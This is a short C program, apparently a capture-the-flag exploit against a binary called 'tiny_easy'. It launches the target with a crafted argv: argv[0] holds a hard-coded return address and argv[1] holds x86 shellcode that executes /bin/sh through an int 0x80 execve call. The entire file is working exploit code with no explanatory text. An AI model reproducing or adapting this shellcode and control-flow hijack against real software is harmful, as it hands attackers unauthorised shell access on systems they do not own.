#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>

// ret @ 0x55 55 7a 19

char *params[] = {
    "\x19\x7A\x55\x55",
    "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0b\x58\x99\xcd\x80",
    NULL
};

int main(int argc, char* argv[]) {
    execve("./tiny_easy", params, NULL);
}
